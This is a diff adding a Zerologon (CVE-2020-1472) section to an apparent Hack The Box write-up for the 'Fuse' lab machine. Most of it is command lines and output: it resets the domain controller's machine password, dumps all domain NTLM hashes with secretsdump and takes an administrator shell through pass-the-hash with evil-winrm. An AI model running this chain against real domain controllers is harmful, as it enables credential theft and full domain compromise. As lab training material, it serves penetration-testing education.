@@ -435,3 +435,93 @@ Password:
 [-] share 'print$' is not writable.
 [-] share 'SYSVOL' is not writable.
 ```
+
+### Zerologon Exploit
+Another alternative of exploiting this machine would be to use the Zerologon exploit (CVE-2020-1472). From the nmap output, we can see that this is likely to be a domain controller as port 389 is open
+
+```
+389/tcp  open  ldap  syn-ack Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+```
+
+Using the ```smb-os-discovery``` script in nmap, we are also able to obtain the NetBios Computer Name, domain name etc of the server
+
+```
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+```
+
+Next, we will download the exploit script from [here](https://github.com/dirkjanm/CVE-2020-1472) and execute the script. Executing the exploit script will then cause the machine password to be set to an empty string
+
+```
+┌──(zerologon)─(kali㉿kali)-[~/Desktop/htb_labs/fuse/CVE-2020-1472]
+└─$ python3 cve-2020-1472-exploit.py FUSE 10.10.10.193                                            1 ⨯
+Performing authentication attempts...
+=================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+```
+
+Afterwards, we can then dump the hashes using ```impacket-secretsdump``` without any credentials
+
+```
+┌──(zerologon)─(kali㉿kali)-[~/Desktop/htb_labs/fuse/CVE-2020-1472]
+└─$ impacket-secretsdump -just-dc -no-pass fabricorp/FUSE\$@10.10.10.193 
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+svc-print:1104:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::
+bnielson:1105:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
+sthompson:1601:aad3b435b51404eeaad3b435b51404ee:5fb3cc8b2f45791e200d740725fdf8fd:::
+tlavel:1602:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
+pmerton:1603:aad3b435b51404eeaad3b435b51404ee:e76e0270c2018153275aab1e143421b2:::
+svc-scan:1605:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::
+bhult:7101:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
+dandrews:7102:aad3b435b51404eeaad3b435b51404ee:689583f00ad18c124c58405479b4c536:::
+mberbatov:7601:aad3b435b51404eeaad3b435b51404ee:b2bdbe60565b677dfb133866722317fd:::
+astein:7602:aad3b435b51404eeaad3b435b51404ee:2f74c867a93cda5a255b1d8422192d80:::
+dmuir:7603:aad3b435b51404eeaad3b435b51404ee:6320f0682f940651742a221d8218d161:::
+FUSE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+```
+
+Using ```crackmapexec```, we can also see that we are able to authenticate using winrm
+
+```
+┌──(zerologon)─(kali㉿kali)-[~/Desktop/htb_labs/fuse/CVE-2020-1472]
+└─$ crackmapexec winrm 10.10.10.193 -u administrator -H aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e
+WINRM       10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
+WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193 
+```
+
+Knowing that, we will use ```evil-winrm``` to authenticate to the vulnerable server
+
+```
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.193 -u administrator -H 370ddcf45959b2293427baa70376e14e                1 ⨯
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+fabricorp\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
